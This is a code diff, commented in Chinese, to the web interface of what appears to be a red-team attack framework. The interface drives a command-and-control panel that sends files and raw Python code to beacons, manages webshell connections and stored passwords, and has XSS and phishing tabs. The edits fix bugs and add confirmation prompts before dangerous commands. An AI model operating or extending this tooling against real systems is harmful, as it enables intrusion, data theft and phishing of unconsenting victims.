-    if (prev && Array.from(sel.options).some(function(o) { return o.value === prev; })) sel.value = prev;
+    // 默认选当前选中的 beacon(与终端 use 一致); 无选中时才退回上次选择
+    const defId = (currentBid && Array.from(sel.options).some(
+        function(o) { return o.value === currentBid; })) ? currentBid : prev;
+    if (defId) sel.value = defId;
     document.getElementById('fe-path').value = '';
     document.getElementById('fe-content').value = '';
     document.getElementById('fe-status').textContent = '';
@@ -2023,10 +2202,10 @@ async function fileEditRead() {
         const data = await resp.json();
         if (!data.ok) { status.textContent = '✗ ' + (data.message || data.error || ''); return; }
         status.textContent = '任务已下发，轮询结果...';
-        pollFileEditRead(bid, data.before_count || 0);
+        pollFileEditRead(bid, data.task_id || '');
     } catch (e) { status.textContent = '✗ 请求失败: ' + e.message; }
 }
-async function pollFileEditRead(bid, before) {
+async function pollFileEditRead(bid, taskId) {
     const status = document.getElementById('fe-status');
     for (let i = 0; i < 50; i++) {
         await new Promise(function(r) { setTimeout(r, 600); });
@@ -2035,13 +2214,29 @@ async function pollFileEditRead(bid, before) {
             const data = await resp.json();
             if (!data.ok || !data.beacon) continue;
             const results = data.beacon.results || [];
-            if (results.length > before) {
-                const last = results[results.length - 1];
-                if (last.error) { status.textContent = '✗ 执行错误: ' + last.error; return; }
-                document.getElementById('fe-content').value = last.output || '';
-                status.textContent = '✓ 已加载 (' + (last.output || '').length + ' 字符)';
+            // 按 task_id 精确匹配本次读任务的结果(而非"取最后一条"):
+            // 并发任务先回/结果窗口滑动时,最后一条可能是别的命令输出,
+            // 会把无关内容当文件内容填进编辑框
+            let hit = null;
+            if (taskId) {
+                for (let j = results.length - 1; j >= 0; j--) {
+                    if (results[j].task_id === taskId) { hit = results[j]; break; }
+                }
+            } else if (results.length) {
+                hit = results[results.length - 1];
+            }
+            if (!hit) continue;
+            if (hit.error) { status.textContent = '✗ 执行错误: ' + hit.error; return; }
+            const outTxt = hit.output || '';
+            // 目标文件不存在 → 转新建模式: 内容留空, 保存时自动创建
+            if (/^\(not found or not a file:/.test(outTxt)) {
+                document.getElementById('fe-content').value = '';
+                status.textContent = '✓ 文件不存在——填写内容后保存将新建该文件';
                 return;
             }
+            document.getElementById('fe-content').value = outTxt;
+            status.textContent = '✓ 已加载 (' + outTxt.length + ' 字符)';
+            return;
         } catch (e) { /* 轮询继续 */ }
     }
     status.textContent = '✗ 等待超时(30s)，请查看终端结果';
@@ -2074,7 +2269,7 @@ async function fileEditSave() {
 async function saveListenerConfig() {
     const payload = {};
     ['lc-server_port', 'lc-client_port',
-     'lc-client_timeout', 'lc-exec_timeout'].forEach(function(id) {
+     'lc-client_timeout'].forEach(function(id) {
         const raw = document.getElementById(id).value.trim();
         const key = id.replace('lc-', '');
         payload[key] = raw === '' ? 0 : parseInt(raw, 10);
@@ -2120,7 +2315,9 @@ function switchMtab(tab) {
     document.getElementById('mtab-implant').style.display = tab === 'implant' ? '' : 'none';
     document.getElementById('mtab-server').style.display = tab === 'server' ? '' : 'none';
     document.getElementById('mtab-manage').style.display = tab === 'manage' ? '' : 'none';
+    document.getElementById('mtab-history').style.display = tab === 'history' ? '' : 'none';
     if (tab === 'manage') loadModuleFiles();
+    if (tab === 'history') renderHistory();
     return false;
 }
 
@@ -2248,6 +2445,9 @@ async function buildModulePreview() {
 async function execModuleFromModal() {
     if (!currentModule) return;
     if (!currentBid) { fs3Alert('请先在左侧选中一个 beacon'); return; }
+    const linet = (currentModule.name + ' ' + mmArgs().join(' ')).trim();
+    // 模块执行同样过危险闸门(此前只拦终端输入, 模块面板可绕过——B5)
+    if (isDangerCmd(linet) && !(await fs3NoteConfirm('模块将执行危险操作:\n' + linet + '\n\n请填写执行备注(必填):'))) return;
     const payload = {client_id: currentBid, name: currentModule.name, args: mmArgs()};
     const api = isRemote() ? '/api/c2/remote/exec' : '/api/c2/module/exec';
     const resp = await fetch(api, {method: 'POST', headers: {'Content-Type': 'application/json'},
@@ -2261,7 +2461,10 @@ async function execModuleFromModal() {
 
 async function runServerModule() {
     if (!currentModule) return;
-    const argsStr = await fs3Prompt('运行参数（空格分隔，可空）:', '') || '';
+    // 取消(null)必须中止——此前 null||'' 会把取消当"无参执行",
+    // s_exec 任意 server 模块照样执行(B4)
+    const argsStr = await fs3Prompt('运行参数（空格分隔，可空）:', '');
+    if (argsStr === null) return;
     termCmd('s_exec ' + currentModule.name + (argsStr.trim() ? ' ' + argsStr.trim() : ''));
     closeModuleModal();
 }
@@ -2530,8 +2733,13 @@ async function sendRawCode() {
     const code = pyCode.value.trim();
     if (!code) { fs3Alert('代码为空'); return; }
     if (!currentBid) { fs3Alert('请先在左侧选中一个 beacon'); return; }
+    // raw = 任意 Python 代码下发执行: 危险操作确认(2026-09-04 B5)
+    if (!(await fs3NoteConfirm('将向 ' + currentBid + ' 下发原始 Python 代码执行(' + code.split('\n').length + ' 行):\n\n请填写执行备注(必填):'))) return;
     termAppend('pyexec> raw (Python 代码, ' + code.split('\n').length + ' 行)', 'techo');
-    const resp = await fetch('/api/c2/raw', {method: 'POST', headers: {'Content-Type': 'application/json'},
+    // 远程模式走 remote/raw(此前硬编码 /api/c2/raw,远程态把代码发到本地
+    // server——2026-09-04 B8)
+    const api = isRemote() ? '/api/c2/remote/raw' : '/api/c2/raw';
+    const resp = await fetch(api, {method: 'POST', headers: {'Content-Type': 'application/json'},
         body: JSON.stringify({client_id: currentBid, code: code})});
     const data = await resp.json();
     termAppend((data.ok ? '' : '[!] ') + (data.message || data.error || ''), '');
@@ -2693,6 +2901,10 @@ async function wsImport() {
 // ── 详情 / 编辑 / 删除 ──
 async function selectWsConn(id) {
     currentWsId = id;
+    // 复位明文密码缓存/显隐状态——此前切连接不清,「显示密码」会把
+    // 上一连接的明文渲染到新连接行上(跨连接泄露, 2026-09-04 B6)
+    wsPassVisible = false;
+    wsPassCache = '';
     document.getElementById('ws-title').textContent = '连接 ' + id.slice(-6);
     renderWsList();
     const resp = await fetch('/api/webshell/connection/' + id);
@@ -3077,25 +3289,39 @@ function wsFileUp() {
 }
 
 async function wsFileRead(path) {
-    const content = await fs3Prompt('读取 ' + path + ' 到输出区?路径确认:', path) || path;
+    // 取消(null)必须中止——此前 null||path 让取消后仍照读文件(B4)
+    const content = await fs3Prompt('读取 ' + path + ' 到输出区?路径确认:', path);
+    if (content === null) return;
     wsFileOp('read', content);
     wsSwitchSub('term');
 }
 
 async function wsFileDownload(path, name) {
-    const resp = fetch('/api/webshell/fileop', {method: 'POST', headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({conn_id: currentWsId, action: 'read', path: path, timeout: wsTimeout()})})
-        .then(function(r) { return r.json(); })
-        .then(function(data) {
-            if (!data.exec_ok) { fs3Alert('下载失败: ' + (data.error || '无输出')); return; }
-            const blob = new Blob([data.output], {type: 'application/octet-stream'});
-            const a = document.createElement('a');
-            a.href = URL.createObjectURL(blob);
-            a.download = name || 'file';
-            a.click();
-            URL.revokeObjectURL(a.href);
-        })
-        .catch(function(e) { fs3Alert('下载失败: ' + e.message); });
+    // 二进制安全下载(2026-09-04 B9): 走 read_base64 专用通道——
+    // 此前走 read 文本通道,cat/type 输出被 utf-8/gbk 解码改写,二进制损坏;
+    // base64 输出纯 ASCII 不受解码影响。约 750KB 原文件上限(输出 1MB 截断)
+    const resp = await fetch('/api/webshell/fileop', {method: 'POST', headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({conn_id: currentWsId, action: 'read_base64', path: path, timeout: wsTimeout()})});
+    let data;
+    try { data = await resp.json(); } catch (e) { fs3Alert('下载失败: ' + e.message); return; }
+    if (!data.exec_ok) { fs3Alert('下载失败: ' + (data.error || '无输出')); return; }
+    // 拼 base64: 滤掉非 base64 行(换行/截断标记/头部噪音)
+    const b64 = (data.output || '').split('\n').map(function(s) { return s.trim(); })
+        .filter(function(l) { return /^[A-Za-z0-9+/=]+$/.test(l); }).join('');
+    if (!b64) { fs3Alert('下载失败: 未取到 base64 内容(文件过大被截断? 上限约 750KB)'); return; }
+    try {
+        const bin = atob(b64);
+        const bytes = new Uint8Array(bin.length);
+        for (let i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i);
+        const blob = new Blob([bytes], {type: 'application/octet-stream'});
+        const a = document.createElement('a');
+        a.href = URL.createObjectURL(blob);
+        a.download = name || 'file';
+        a.click();
+        URL.revokeObjectURL(a.href);
+    } catch (e) {
+        fs3Alert('下载失败: base64 解码错误(' + e.message + ')');
+    }
 }
 
 async function wsFileRename(path) {
@@ -3217,7 +3443,7 @@ async function clearWsHistoryAll() {
 
 // ── 初始化 ──
 renderSnippets();
-{% if tab == 'c2' %}loadStatus();{% elif tab == 'xss' %}loadPhStatus(); loadPhModules(); loadPhReports(); loadPhConfig(); loadPhLinks();{% elif tab == 'phishing' %}loadPhStatus(); loadPhPages(); loadPhDownloads(); loadPhLinks();{% else %}loadWsConnections();{% endif %}
+{% if tab == 'c2' %}loadStatus(); toggleAutoRefresh();{% elif tab == 'xss' %}loadPhStatus(); loadPhModules(); loadPhReports(); loadPhConfig(); loadPhLinks();{% elif tab == 'phishing' %}loadPhStatus(); loadPhPages(); loadPhDownloads(); loadPhLinks();{% else %}loadWsConnections();{% endif %}
 
 // ══════════════════════ 钓鱼页面(phishing) ══════════════════════
 var phTimer = null;
